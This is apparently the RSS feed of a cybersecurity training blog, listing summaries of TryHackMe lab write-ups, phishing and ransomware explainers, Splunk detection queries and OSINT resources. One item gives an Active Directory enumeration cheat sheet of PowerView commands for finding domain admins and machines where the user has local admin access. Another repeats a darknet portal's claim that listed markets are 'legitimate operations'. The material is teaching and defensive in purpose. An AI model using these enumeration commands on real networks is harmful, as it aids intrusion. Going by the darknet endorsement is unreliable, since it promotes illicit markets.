<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Classroom</title><link>https://classroom.anir0y.in/</link><description>Recent content on Classroom</description><generator>Anir0ry : Blog v1.0</generator><language>en</language><copyright>YOU CAN REUSE MY CONTENT</copyright><lastBuildDate>Mon, 02 Oct 2023 14:34:21 +0530</lastBuildDate><atom:link href="https://classroom.anir0y.in/index.xml" rel="self" type="application/rss+xml"/><item><title>Blog Tor Darknet Links</title><pubDate>Mon, 02 Oct 2023 14:34:21 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/darknet.png" width="700" height="420"/><description>OverView All the sites listed have been verified by DarkNetEye as being legitimate operations. Beware of unverified links which may result in you being scammed. DarkNetEye is one of the oldest and most established darknet news and link portals which is used by thousands of people every day to access the darknet safely. These are a selection of the most popular darknet markets and services which are currently listed on our platform:</description><enclosure url="https://classroom.anir0y.in/img/darknet.png"/><link>https://classroom.anir0y.in/post/blog-tor-darknet-links/</link></item><item><title>How to Trust Imported GPG Keys</title><pubDate>Tue, 30 May 2023 11:59:25 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/gpg.png" width="700" height="420"/><description>TLDR When you import a GPG key, you are trusting that the key belongs to the person or organization who claims to own it. There are a few ways to trust imported GPG keys:
Web of trust: The web of trust is a decentralized system for verifying GPG keys. When you import a key, you can choose to trust it based on the trust of other people in the web of trust.</description><enclosure url="https://classroom.anir0y.in/img/gpg.png"/><link>https://classroom.anir0y.in/post/blog-how-to-trust-imported-gpg-keys/</link></item><item><title>AutoHackOS A New Operating System for Automobile Pentesting</title><pubDate>Tue, 09 May 2023 20:42:03 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.inhttps://www.autohackos.com/images/illustrations/worker.svg" width="700" height="420"/><description>TLDR AutoHackOS is a new operating system that helps you test the security of connected vehicles. It comes with various tools and frameworks that let you perform different types of attacks and analyses on vehicles and their networks. Whether you are a security researcher, enthusiast, or professional, AutoHackOS can help you discover and exploit vulnerabilities in vehicle software and hardware before hackers do. Download AutoHackOS today and start your automobile pentesting journey.</description><enclosure url="https://classroom.anir0y.inhttps://www.autohackos.com/images/illustrations/worker.svg"/><link>https://classroom.anir0y.in/post/blog-autohackos/</link></item><item><title>SOC Splunk101</title><pubDate>Mon, 10 Apr 2023 19:27:17 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/soc-101.png" width="700" height="420"/><description>some Use Cases for Splunk. 1- Windows Audit Log Tampering Check for any tampering done to Windows audit logs.
index=__your_sysmon_index__ (sourcetype=wineventlog AND (EventCode=1102 OR EventCode=1100)) OR (sourcetype=wineventlog AND EventCode=104) | stats count by _time EventCode Message sourcetype host 2- Finding Large Web Uploads Find large file uploads that could point to data exfiltration in your network.
index=__your_sysmon_index__ sourcetype=websense* | where bytes_out &amp;gt; 35000000 | table _time src_ip bytes* uri 3- Detecting Recurring Malware on Host Using anti-virus logs to detect if malware is recurring on a host after being removed.</description><enclosure url="https://classroom.anir0y.in/img/soc-101.png"/><link>https://classroom.anir0y.in/post/soc-splunk101/</link></item><item><title>Optimizing Web Application Performance and Security With Azure Front Door and Application Gateway</title><pubDate>Thu, 16 Mar 2023 22:06:19 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/az-sec-1.png" width="700" height="420"/><description>How to configure Azure Front Door with Application Gateway Azure Front Door and Application Gateway are two services that can help you improve the performance and security of your web applications. In this post, we will explain what they are, how they work together, and how to configure them step by step.
What is Azure Front Door? Azure Front Door is an Application Delivery Network (ADN) as a service, offering various layer 7 load-balancing capabilities for your applications.</description><enclosure url="https://classroom.anir0y.in/img/az-sec-1.png"/><link>https://classroom.anir0y.in/post/blog-optimizing-web-application-performance-and-security-with-azure-front-door-and-application-gateway/</link></item><item><title>Blog | Watering Hole Attacks Scanbox Keylogger</title><pubDate>Sun, 12 Mar 2023 19:25:10 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/Watering_Hole_Attacks_Scanbox_Keylogger.png" width="700" height="420"/><description>A new report by researchers at CyCraft has revealed that a sophisticated cyberattack campaign has been using watering hole attacks to deliver a Scanbox keylogger to victims across various industries Watering hole attacks are a form of cyberattack that targets groups of users by infecting websites that they commonly visit. The attackers then wait for an opportunity to compromise their devices and gain access to their networks.
Scanbox is a keylogger that can capture keystrokes, screenshots, and other information from the infected devices.</description><enclosure url="https://classroom.anir0y.in/img/Watering_Hole_Attacks_Scanbox_Keylogger.png"/><link>https://classroom.anir0y.in/post/blog-watering-hole-attacks-scanbox-keylogger/</link></item><item><title>4 types of phishing</title><pubDate>Wed, 22 Feb 2023 18:50:22 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/1HI2dWi.png" width="700" height="420"/><description>Phishing is a type of cyber attack that involves deceiving individuals or organizations to obtain sensitive information such as usernames, passwords, and credit card details. Phishing attacks can take various forms, but the ultimate goal is to trick people into revealing their confidential information. In this blog post, we will discuss four types of phishing attacks.
Email Phishing Email phishing is the most common type of phishing attack. It involves sending fraudulent emails that appear to be from reputable sources, such as banks, social media platforms, or government agencies.</description><enclosure url="https://classroom.anir0y.in/img/1HI2dWi.png"/><link>https://classroom.anir0y.in/post/blog-types-of-phishing/</link></item><item><title>Smishing - Understanding and Protecting Against the Growing Threat of Phishing via Text Message</title><pubDate>Thu, 26 Jan 2023 00:03:57 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/smshing.png" width="700" height="420"/><description>[ADS] Arishti.live is back with more training contents
This article explains what smishing is, how it works and how to protect yourself from falling victim to a smishing attack. Smishing is a type of phishing that uses text messages to trick individuals into giving away sensitive information. Learn about common smishing tactics, how to spot a smishing message and the best ways to protect yourself from this growing threat. With this knowledge, you can stay safe and secure online.</description><enclosure url="https://classroom.anir0y.in/img/smshing.png"/><link>https://classroom.anir0y.in/post/smshingintro/</link></item><item><title>BitLy url shortner</title><pubDate>Tue, 29 Nov 2022 15:32:55 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/bitly.png" width="700" height="420"/><description>OverView we&amp;rsquo;re going to write a python script to get short URLs using Bit.ly
get the API from BITLY signup to bitly.com and login to the dashboard, then click on API section and click on create API
ref to the image below:
follow the instructions:
click on settings after login click on API Enter your password and then click on generate token. save the token as we will be using it on our script.</description><enclosure url="https://classroom.anir0y.in/img/bitly.png"/><link>https://classroom.anir0y.in/post/bitly_url_shortner/</link></item><item><title>BLOG | Shorten URL using TinyURL API</title><pubDate>Sun, 13 Nov 2022 18:47:39 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.inimg/tinyURL.png" width="700" height="420"/><description>OverView this is unsuall post on how to create short urls. in this post I&amp;rsquo;ll be usng tiny.url APIs.
get the API from tinyurl.com signup to tinyurl.com and login to the dashboard, then click on API section and click on create API
now you&amp;rsquo;ll have a API key!!!
[optional] setup custom domain (FREE) click on branded domain setting, and create a domain, ref to image:
Automation time Now, we have everything we need.</description><enclosure url="https://classroom.anir0y.inimg/tinyURL.png"/><link>https://classroom.anir0y.in/post/tinyurl/</link></item><item><title>Try Hack Me writeup | Osquery The Basics</title><pubDate>Sat, 12 Nov 2022 18:18:23 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/osquery-1.png" width="700" height="420"/><description>OverView Follow @anir0y Osquery The Basics solvedSubscriber only Task 01: Introduction Osquery is an open-source agent created by Facebook in 2014. It converts the operating system into a relational database. It allows us to ask questions from the tables using SQL queries, like returning the list of running processes, a user account created on the host, and the process of communicating with certain suspicious domains. It is widely used by Security Analysts, Incident Responders, Threat Hunters, etc.</description><enclosure url="https://classroom.anir0y.in/img/osquery-1.png"/><link>https://classroom.anir0y.in/post/tryhackme-osquerythebasics/</link></item><item><title>Writeup |Try Hack Me PrintNightmare, again!</title><pubDate>Mon, 31 Oct 2022 14:14:20 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/PrintNightmare2.png" width="700" height="420"/><description>OverView Search the artifacts on the endpoint to determine if the employee used any of the Windows Printer Spooler vulnerabilities to elevate their privileges.
Follow @anir0y [FREE ROOM] PrintNightmare, again Detection Scenario: In the weekly internal security meeting it was reported that an employee overheard two co-workers discussing the PrintNightmare exploit and how they can use it to elevate their privileges on their local computers.
Task: Inspect the artifacts on the endpoint to detect the exploit they used.</description><enclosure url="https://classroom.anir0y.in/img/PrintNightmare2.png"/><link>https://classroom.anir0y.in/post/tryhackme-printnightmareagain/</link></item><item><title>TryHackMe Surfer</title><pubDate>Sat, 22 Oct 2022 17:00:08 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/surfer.png" width="700" height="420"/><description>OverView Follow @anir0y Operating System Security Operating System Security [Subscription Required] Operating System Security walkthrough I&amp;rsquo;m trying new things with video, you can watch me solve this lab here:</description><enclosure url="https://classroom.anir0y.in/img/surfer.png"/><link>https://classroom.anir0y.in/post/tryhackme-surfer/</link></item><item><title>Android MalwareAnalysis</title><pubDate>Tue, 11 Oct 2022 19:04:38 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/amat.png" width="700" height="420"/><description>Follow @anir0y
Android Malware Analysis Tools Static Analysis tools short Description ClassyShark Standalone android apps binary inspection tool.ClassyShark StaCoAn Mobile application static code analysis tool. APK-MiTM CLI application that automatically prepares Android APK files for HTTPS inspection. Dynamic Analysis tools short Description AppMon Automated framework for monitoring and tampering system API calls based on Frida. Wireshark Network analysis tool. tcpdump Network analysis tool. MiTMProxy An interactive SSL/TLS-capable intercepting HTTP proxy (great for HTTPS inspection).</description><enclosure url="https://classroom.anir0y.in/img/amat.png"/><link>https://classroom.anir0y.in/post/android-malwareanalysis/</link></item><item><title>Vulnerable Web Application is now available!</title><pubDate>Fri, 30 Sep 2022 18:50:22 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/1HI2dWi.png" width="700" height="420"/><description>Overview VWA is a vulnerable web application focused on showcasing some most common attacks &amp;amp; apply fixes!
why not DVWA ?? well the idea behind creating this lab was to making is easy to read code so it can be used for &amp;ldquo;Secure coding&amp;rdquo; labs as well as application security. DVWA is a amazing start point where you can set and see different levels of vulnerability and the secure code practice.</description><enclosure url="https://classroom.anir0y.in/img/1HI2dWi.png"/><link>https://classroom.anir0y.in/post/blog-vwa/</link></item><item><title>Try Hack Me Intermediate Nmap</title><pubDate>Fri, 23 Sep 2022 15:28:41 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/IntermediateNmap.png" width="700" height="420"/><description>OverView Follow @anir0y Intermediate Nmap {FREE ROOM} Task 01: You&amp;rsquo;ve learned some great nmap skills! Now can you combine that with other skills with netcat and protocols, to log in to this machine and find the flag? This VM MACHINE_IP is listening on a high port, and if you connect to it it may give you some information you can use to connect to a lower port commonly used for remote access!</description><enclosure url="https://classroom.anir0y.in/img/IntermediateNmap.png"/><link>https://classroom.anir0y.in/post/thm-intermediatenmap/</link></item><item><title>Try Hack Me Phishing Emails 4</title><pubDate>Tue, 16 Aug 2022 15:24:03 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/phishing-4.png" width="700" height="420"/><description>OverView Follow @anir0y Phishing Email 4 Phishing Email 4 [Subscription Required] Phishing Email 4 Task 01: Introduction 1.1 What is the MITRE ID for Software Configuration? Answer : M1054
Task 02: PF (Sender Policy Framework) What is the Sender Policy Framework (SPF)?
Per dmarcian, &amp;ldquo;Sender Policy Framework (SPF) is used to authenticate the sender of an email. With an SPF record in place, Internet Service Providers can verify that a mail server is authorized to send email for a specific domain.</description><enclosure url="https://classroom.anir0y.in/img/phishing-4.png"/><link>https://classroom.anir0y.in/post/tryhackme-phishingemails4/</link></item><item><title>Try Hack Me Red Team Threat Intel</title><pubDate>Fri, 12 Aug 2022 13:05:49 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/redteamthreatintel.png" width="700" height="420"/><description>OverView Follow @anir0y Operating System Security Operating System Security [Subscription Required] Operating System Security Task 01: Introduction Threat Intelligence (TI) or Cyber Threat Intelligence (CTI) is the information, or TTPs (Tactics, Techniques, and Procedures), attributed to an adversary, commonly used by defenders to aid in detection measures. The red cell can leverage CTI from an offensive perspective to assist in adversary emulation.
Learning Objectives
Understand the basics of threat intelligence and how it can be applied to red team engagements.</description><enclosure url="https://classroom.anir0y.in/img/redteamthreatintel.png"/><link>https://classroom.anir0y.in/post/tryhackme-redteamthreatintel/</link></item><item><title>Basics of Ransomware</title><pubDate>Mon, 20 Jun 2022 16:58:42 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/ransomware.png" width="700" height="420"/><description>Let&amp;rsquo;s learn about Ransomware Ransomware is a malicious computer software which encrypts the computer&amp;rsquo;s data thereby blocking access to it. The ransomware will demand an amount (Ransom) which is to be paid via Bitcoin or any other such crypto currencies in order to get our files restored to their original form. The first documented case appeared in 2005 in the United States, but quickly spread around the world
Here is a MAP how ransomware works :</description><enclosure url="https://classroom.anir0y.in/img/ransomware.png"/><link>https://classroom.anir0y.in/post/what_is_ransomware/</link></item><item><title>OSINT Resources I</title><pubDate>Mon, 30 May 2022 03:36:44 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/OSINT_Tools.png" width="700" height="420"/><description>OverView 🕵️ OSINT Tools for gathering information and actions forensic 🕵️
🕵️ Collection of 4000+ OSINT resources https://metaosint.github.io/table/
SpiderFoot automates OSINT for threat intelligence and mapping your attack surface. https://github.com/smicallef/spiderfoot
Hayabusa Hayabusa is a sigma-based threat hunting and fast forensics timeline generator for Windows event logs written in Rust. : https://github.com/Yamato-Security/hayabusa
Awesome forensics A curated list of awesome forensic analysis tools and resources. : https://github.com/patronuscode/awesome-forensics
MVT MVT (Mobile Verification Toolkit) helps with conducting forensics of mobile devices in order to find signs of a potential compromise.</description><enclosure url="https://classroom.anir0y.in/img/OSINT_Tools.png"/><link>https://classroom.anir0y.in/post/osint_resources-i/</link></item><item><title>Steganography with Steghide</title><pubDate>Thu, 26 May 2022 21:42:28 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/Stegnography_with_Steghide.png" width="700" height="420"/><description>Choice of tools Steghide: Is an open-source, command-line software that can encode and decode data into image files
Features:
compression of embedded data encryption of embedded data embedding of a checksum to verify the integrity of the extracted data support for JPEG, BMP, WAV and AU files Installation (Linux) apt-get install steghide Creating an image with a secret message in it. Create a folder with the name of your choice:</description><enclosure url="https://classroom.anir0y.in/img/Stegnography_with_Steghide.png"/><link>https://classroom.anir0y.in/post/stegnography/</link></item><item><title>Try Hack Me Operating System Security [WriteUp]</title><pubDate>Mon, 16 May 2022 12:02:51 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/Operating_System_Security.png" width="700" height="420"/><description>OverView This room introduces users to operating system security and demonstrates SSH authentication on Linux.
Follow @anir0y Operating System Security Operating System Security [Subscription Required] Operating System Security Introduction to Operating System Security Every day you use a smartphone or a laptop or almost any type of computer, you interact directly or indirectly with an operating system. Operating systems include MS Windows, macOS, iOS, Android, Chrome OS, and Linux. But what is an operating system?</description><enclosure url="https://classroom.anir0y.in/img/Operating_System_Security.png"/><link>https://classroom.anir0y.in/post/tryhackme-operatingsystemsecurity/</link></item><item><title>TryHackMe Oh My Webserver</title><pubDate>Wed, 09 Mar 2022 10:50:11 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/ohmyweb.png" width="700" height="420"/><description>OverView This is a free room, which means anyone can deploy virtual machines in the room (without being subscribed)! 1682 users are in here and this room is 152 days old.
Follow @anir0y oh-My-Webserver oh-My-Webserver [FREE] oh-My-Webserver recon let&amp;rsquo;s start with Nmap sudo nmap -sC -sV -oA initial-s1 10.10.216.165 -vv -Pn -n Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-09 05:27 GMT [snip] Not shown: 998 filtered ports Reason: 998 no-responses PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 64 OpenSSH 8.</description><enclosure url="https://classroom.anir0y.in/img/ohmyweb.png"/><link>https://classroom.anir0y.in/post/tryhackme-oh-my-webserver/</link></item><item><title>DVWA Docker Setup</title><pubDate>Sat, 05 Mar 2022 21:05:05 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/dvwa-main.png" width="700" height="420"/><description>Damn Vulnerable Web Application Docker container Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students &amp;amp; teachers to learn about web application security in a controlled class room environment.</description><enclosure url="https://classroom.anir0y.in/img/dvwa-main.png"/><link>https://classroom.anir0y.in/post/dvwa-docker-setup/</link></item><item><title>Domain Enumeration Cheat Sheet</title><pubDate>Sat, 26 Feb 2022 20:55:07 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/doamin-enum.png" width="700" height="420"/><description>Get all the member of the Domain Admins Group Get-NetGroupMember -GroupName &amp;quot;Domain Admins&amp;quot;
or ActiveDirectory module Get-ADGroupMember -Identity &amp;quot;Domain Admins&amp;quot; -Recursive
Get the group membership for a user Get-NetGroup -UserName &amp;quot;labuser&amp;quot;
or ActiveDirectory module Get_ADPrincipalGroupMembership -Identity labuser
Get all computers of the domain Get-NetComputer (-FullData)
Using ActiveDirectory module Get-ADComputer -Filter * | select Name Get-ADComputer -Filter * -Properties *
Find all machines on the current domain where the current user has local admin access Find-LocalAdminAccess -Verbose</description><enclosure url="https://classroom.anir0y.in/img/doamin-enum.png"/><link>https://classroom.anir0y.in/post/notes-domainenum/</link></item><item><title>TryHackMe Jr Security Analyst Intro</title><pubDate>Sat, 26 Feb 2022 11:57:17 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/soc-1.png" width="700" height="420"/><description>OverView Follow @anir0y Jr Security Analyst Intro Jr Security Analyst Intro [FREE ROOM] Jr Security Analyst Intro A career as a Junior (Associate) Security Analyst In the Junior Security Analyst role, you will be a Triage Specialist. You will spend a lot of time triaging or monitoring the event logs and alerts.
The responsibilities for a Junior Security Analyst or Tier 1 SOC Analyst include:
Monitor and investigate the alerts (most of the time, it&amp;rsquo;s a 24x7 SOC operations environment) Configure and manage the security tools Develop and implement basic IDS (Intrusion Detection System) signatures Participate in SOC working groups, meetings Create tickets and escalate the security incidents to the Tier 2 and Team Lead if needed Required qualifications (most common):</description><enclosure url="https://classroom.anir0y.in/img/soc-1.png"/><link>https://classroom.anir0y.in/post/tryhackme-jr-security-analyst-intro/</link></item><item><title>TryHackMe Phishing Emails 2</title><pubDate>Wed, 26 Jan 2022 13:16:10 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/phishing-email-2.png" width="700" height="420"/><description>OverView Follow @anir0y Phishing Emails 2 Phishing Emails 2 [FREE ROOM] Phishing Emails 2 Task 01: Introduction read the task
Task 02: Cancel your PayPal order The email sample in this task will highlight the following techniques:
Spoofed email address URL shortening services HTML to impersonate a legitimate brand Here are some quick observations about this email sample:
This is an unusual email recipient address. This is not the email address associated with the Yahoo account.</description><enclosure url="https://classroom.anir0y.in/img/phishing-email-2.png"/><link>https://classroom.anir0y.in/post/tryhackme-phishingemails-2/</link></item><item><title>Try Hack Me Phishing Emails 1</title><pubDate>Mon, 24 Jan 2022 17:33:15 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/phish-e-1.png" width="700" height="420"/><description>OverView Follow @anir0y Phishing Emails 1 Phishing Emails 1 [FREE ROOM] Phishing Emails 1 Task 01: Introduction read the task
Task 02: The email address It&amp;rsquo;s only appropriate to start this room by mentioning the man who invented the concept of emails and made the @ symbol famous. The person responsible for the contribution to the way we communicate was Ray Tomlinson.
The invention of the email dates back to the 1970s for ARPANET.</description><enclosure url="https://classroom.anir0y.in/img/phish-e-1.png"/><link>https://classroom.anir0y.in/post/phishingemails1tryoe/</link></item><item><title>Try Hack Me Android Malware Analysis</title><pubDate>Sun, 23 Jan 2022 11:38:33 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/ama.png" width="700" height="420"/><description>OverView Follow @anir0y Android Malware Analysis Android Malware Analysis [FREE ROOM] Android Malware Analysis Task 01: Introduction Hi all! In this room, we are going to investigate some Android malware and learn how to pivot from the information we have to build hunting rules and find similar samples. To do this room, it is recommended to have done the following rooms (especially if you&amp;rsquo;re a beginner):
Task 02: First steps Most Android malware masquerades as a normal application.</description><enclosure url="https://classroom.anir0y.in/img/ama.png"/><link>https://classroom.anir0y.in/post/tryhackme-androidmalwareanalysis/</link></item><item><title>Classroom | NFS Installation &amp; enumeation</title><pubDate>Wed, 19 Jan 2022 13:47:54 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/blog-nfs.png" width="700" height="420"/><description>OverView Network File System (NFS) is a distributed file system protocol originally developed by Sun Microsystems (Sun) in 1984, allowing a user on a client computer to access files over a computer network much like local storage is accessed. NFS, like many other protocols, builds on the Open Network Computing Remote Procedure Call (ONC RPC) system. NFS is an open IETF standard defined in a Request for Comments (RFC), allowing anyone to implement the protocol.</description><enclosure url="https://classroom.anir0y.in/img/blog-nfs.png"/><link>https://classroom.anir0y.in/post/classroom-nfs/</link></item><item><title>Try Hack Me Road</title><pubDate>Tue, 30 Nov 2021 15:39:49 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/road.png" width="700" height="420"/><description>OverView Inspired by a real-world pentesting engagement
Follow @anir0y Road Road [FREE ROOM] Road As usual, obtain the user and root flag Recon nmap Basic Scan[nmap]
# Nmap 7.92 scan initiated Tue Nov 30 05:12:53 2021 as: nmap -sC -sV -oN nmap/init -vv 10.10.4.240 Nmap scan report for 10.10.4.240 Host is up, received reset ttl 60 (0.15s latency). Scanned at 2021-11-30 05:12:54 EST for 14s Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 8.</description><enclosure url="https://classroom.anir0y.in/img/road.png"/><link>https://classroom.anir0y.in/post/tryhackme-road/</link></item><item><title>Try Hack Me CyberCrafted</title><pubDate>Wed, 24 Nov 2021 15:54:45 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/CyberCrafted.png" width="700" height="420"/><description>OverView Pwn this pay-to-win Minecraft server!
Follow @anir0y CyberCrafted CyberCrafted [Free Room] CyberCrafted Task 01: Deploy the machine Task 02: Root it Answer the questions below Task Question Ans 1 How many ports are open? 2.1 2 What service runs on the highest port? 2.2 3 Any subdomains? (Alphabetical order) 2.3 4 On what page did you find the vulnerability? 2.4 5 What is the admin&amp;rsquo;s username? (Case-sensitive) 2.5 6 What is the web flag?</description><enclosure url="https://classroom.anir0y.in/img/CyberCrafted.png"/><link>https://classroom.anir0y.in/post/tryhackme-cybercrafted/</link></item><item><title>Try Hack Me REvil Corp</title><pubDate>Tue, 23 Nov 2021 13:51:46 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.inhttps://tryhackme-images.s3.amazonaws.com/room-icons/b2802c4d2bc81aa4f095d1c0d9e55ab1.png" width="700" height="420"/><description>OverView You are involved in an incident response engagement and need to analyze an infected host using Redline.
Follow @anir0y REvil Corp REvil Corp [FREE ROOM] REvil Corp Task 01: Investigating the Compromised Endpoint Scenario: One of the employees at Lockman Group gave an IT department the call; the user is frustrated and mentioned that all of his files are renamed to a weird file extension that he has never seen before.</description><enclosure url="https://classroom.anir0y.inhttps://tryhackme-images.s3.amazonaws.com/room-icons/b2802c4d2bc81aa4f095d1c0d9e55ab1.png"/><link>https://classroom.anir0y.in/post/tryhackme-revilcorp/</link></item><item><title>Try Hack Me Phishing</title><pubDate>Tue, 16 Nov 2021 18:51:09 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/phishing.png" width="700" height="420"/><description>OverView Learn what phishing is and why it&amp;rsquo;s important to a red team engagement. You will set up phishing infrastructure, write a convincing phishing email and try to trick your target into opening your email in a real-world simulation.
Follow @anir0y Phishing Phishing [Subscription Required] Phishing Task 01: Brief This room will take you through what phishing is, how it&amp;rsquo;s performed, some valuable tools and why it&amp;rsquo;s an essential part of a Red Team engagement.</description><enclosure url="https://classroom.anir0y.in/img/phishing.png"/><link>https://classroom.anir0y.in/post/tryhackme-phishingyl/</link></item><item><title>Try Hack Me Vulnerability Capstone[writeup]</title><pubDate>Fri, 29 Oct 2021 12:13:26 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/Vulnerability-Capstone.png" width="700" height="420"/><description>OverView Ackme Support Incorporated has recently set up a new blog. Their developer team have asked for a security audit to be performed before they create and publish articles to the public.
Follow @anir0y Vulnerability Capstone Vulnerability Capstone [Subscription Required] Vulnerability Capstone Task 01: Introduction Ackme Support Incorporated has recently set up a new blog. Their developer team have asked for a security audit to be performed before they create and publish articles to the public.</description><enclosure url="https://classroom.anir0y.in/img/Vulnerability-Capstone.png"/><link>https://classroom.anir0y.in/post/tryhackme-vulnerabilitycapstone/</link></item><item><title>Try Hack Me Net Sec Challenge</title><pubDate>Mon, 18 Oct 2021 13:50:55 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/netsecchallenge.gif" width="700" height="420"/><description>OverView Follow @anir0y Net Sec Challenge Net Sec Challenge [Subscription Required] Net Sec Challenge Task 01: Introduction Use this challenge to test your mastery of the skills you have acquired in the Network Security module. All the questions in this challenge can be solved using only nmap, telnet, and hydra.
start the VM Task 02: Challenge Questions Answer the questions below Question Answer What is the highest port number being open less than 10,000?</description><enclosure url="https://classroom.anir0y.in/img/netsecchallenge.gif"/><link>https://classroom.anir0y.in/post/tryhackme-netsecchallenge/</link></item><item><title>DigitalOcean Account Setup</title><pubDate>Sun, 03 Oct 2021 21:58:41 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/do.gif" width="700" height="420"/><description>OverView Deploy faster &amp;amp; scale easier with an application server that saves your team time &amp;amp; money. Get started with fast, secure, and reliable cloud infrastructure solutions. Try for free. Premium AMD w/ NVMe SSD. Scale Quickly. Manage W/ Teams. Simple API. 55 Sec. Deploy.
Start your free trial with a $100 credit for 60 days Get $100 to try DigitalOcean – and do all the below for free!
Build apps, host websites, run open source software, learn cloud computing, and more – every cloud resource you need at an affordable price.</description><enclosure url="https://classroom.anir0y.in/img/do.gif"/><link>https://classroom.anir0y.in/post/ref-do/</link></item><item><title>TryHackMe Metasploit Meterpreter</title><pubDate>Thu, 30 Sep 2021 13:21:37 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/msf.gif" width="700" height="420"/><description>OverView Take a deep dive into Meterpreter, and see how in-memory payloads can be used for post-exploitation.
Follow @anir0y Metasploit: Meterpreter Metasploit: Meterpreter [Subscription Required] Metasploit: Meterpreter Task 01: Introduction to Meterpreter Meterpreter is a Metasploit payload that supports the penetration testing process with many valuable components. Meterpreter will run on the target system and act as an agent within a command and control architecture. You will interact with the target operating system and files and use Meterpreter&amp;rsquo;s specialized commands.</description><enclosure url="https://classroom.anir0y.in/img/msf.gif"/><link>https://classroom.anir0y.in/post/tryhackme-meterpreter/</link></item><item><title>Try Hack Me Exploit Vulnerabilities</title><pubDate>Sun, 26 Sep 2021 08:29:10 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/exploitingavulnerabilityv2.png" width="700" height="420"/><description>OverView Follow @anir0y Exploit Vulnerabilities Exploit Vulnerabilities [Subscription Required] Exploit Vulnerabilities Task 01: Introduction In this room, we are going to be going over some means of identifying vulnerabilities and coupling our research skills to learn how these can be abused.
Task 02: Automated Vs. Manual Vulnerability Research There is a myriad of tools and services available in cybersecurity for vulnerability scanning. Ranging from being commercial (and footing a heavy bill) to open-source and free, vulnerability scanners are convenient means of quickly canvassing an application for flaws.</description><enclosure url="https://classroom.anir0y.in/img/exploitingavulnerabilityv2.png"/><link>https://classroom.anir0y.in/post/tryhackme-exploitingavulnerabilityv2.md/</link></item><item><title>Try Hack Me Vulnerabilities 101</title><pubDate>Tue, 21 Sep 2021 14:21:54 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/Vulnerabilities101.png" width="700" height="420"/><description>OverView Understand the flaws of an application and apply your researching skills on some vulnerability databases.
